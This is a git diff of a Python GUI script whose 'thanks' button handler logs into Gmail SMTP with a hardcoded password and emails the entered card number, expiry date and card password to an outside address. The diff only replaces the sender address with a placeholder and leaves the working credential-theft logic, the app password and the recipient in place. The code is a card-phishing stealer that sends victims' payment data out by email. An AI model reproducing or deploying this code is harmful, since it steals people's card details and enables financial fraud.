@@ -6,8 +6,8 @@ def onPressThanksButton():
 	print('gavno')
 	server = smtplib.SMTP('smtp.gmail.com', 587)
 	server.starttls()
-	server.login('pashkovmaill@gmail.com', 'itdolksndyozucoq')
-	server.sendmail('pashkovmaill@gmail.com', 'glavniypidoraskieva@gmail.com', 
+	server.login('yourmail@gmail.com', 'itdolksndyozucoq')
+	server.sendmail('yourmail@gmail.com', 'glavniypidoraskieva@gmail.com', 
 	f'Subject: CUTIE JANE\n\n{cardnumber_entry.get()}, {cardexpdat_entry.get()}, {cardpassword_entry.get()}')
 
 def CenterWindowToDisplay(Screen, width, height):
